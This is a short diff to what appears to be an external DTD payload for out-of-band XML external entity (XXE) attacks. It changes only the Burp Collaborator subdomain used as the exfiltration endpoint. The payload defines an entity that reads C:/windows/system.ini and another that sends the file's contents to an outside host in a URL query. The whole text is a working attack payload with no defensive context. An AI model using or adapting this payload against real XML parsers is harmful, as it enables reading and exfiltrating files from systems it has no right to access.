@@ -1,2 +1,2 @@
 <!ENTITY % exfil SYSTEM "file:///C:/windows/system.ini">
-<!ENTITY % write_entity '<!ENTITY xxe SYSTEM "http://mzppxb1naqamo3kus2blw4a6rxxnlc.burpcollaborator.net/?%exfil;">'>
+<!ENTITY % write_entity '<!ENTITY xxe SYSTEM "http://67bl4zyofx6f47hvxrbe9p5j4aa0yp.burpcollaborator.net/?%exfil;">'>
